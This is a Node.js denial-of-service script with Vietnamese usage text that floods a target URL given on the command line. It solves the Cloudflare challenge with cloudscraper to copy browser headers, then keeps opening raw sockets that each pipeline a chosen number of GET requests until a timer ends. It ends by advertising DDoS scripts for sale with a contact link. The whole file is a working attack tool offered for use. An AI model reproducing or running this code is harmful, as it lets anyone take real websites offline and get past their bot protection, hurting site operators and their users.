require('events').EventEmitter.defaultMaxListeners = 0;
import CloudScraper from 'cloudscraper';
import path from 'path';
import url from 'url';
import net from 'net';

if (process.argv.length !== 5) {
    console.log(`
Cách Dùng : node ${path.basename(__filename)} <url> <time> <req_per_ip>
Ví dụ : node ${path.basename(__filename)} https://DagTri.com 60 150`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    host = url.parse(target).host;

let getHeaders = function () {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 1
        }, function (error, response) {
            if (error) {
                // If cloudscraper returns an error, retry the request
                console.log(`ERROR: ${error.message}, retrying the request.`);
                return start();
            }
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i, e) {
                // The following headers might break the request
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });

            console.log(headers);
            resolve(headers);
        });
    });
}

function send_req(headers) {
    const client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(10000);

    for (let i = 0; i < req_per_ip; ++i) {
        client.write(
            `GET ${target} HTTP/1.1\r\n` +
            headers + '\r\n\r\n'
        )
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
        }, 5000);
    });
}

let init = function () {
    getHeaders().then(function (result) {
        console.log('Attack Sent ! Thanks for using my script <3 DagTriZaker');
        setInterval(() => {
            send_req(result);
        });
    });
};

setTimeout(() => {
    console.log('Attack End | Buy Script DDoS Contact https://facebook.com/dangtriofficial.3107');
    process.exit(0)
}, time * 1000);

init();

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
